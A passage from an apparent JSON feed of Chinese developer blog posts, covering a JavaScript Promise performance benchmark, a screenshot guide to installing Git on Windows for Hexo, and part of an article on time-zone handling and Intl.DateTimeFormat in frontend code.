性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-built_in\">Promise</span>.all(userIds.map(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> fetch(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) </span>{  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> fibonacciSequence()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\n    return new Date(date.toLocaleString('en-US', { timeZone }))\n}\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\n        year: 'numeric',\n        month: '2-digit',\n        day: '2-digit',\n        hour: '2-digit',\n        minute: '2-digit',\n        second: '2-digit',\n        hour12: false,\n        timeZone\n    })\n    return {\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\n        convert (date) {\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\n        }\n    }\n}\n\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\n    return converter.convert(new Date(secDate), tzName) - secDate\n}\n\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 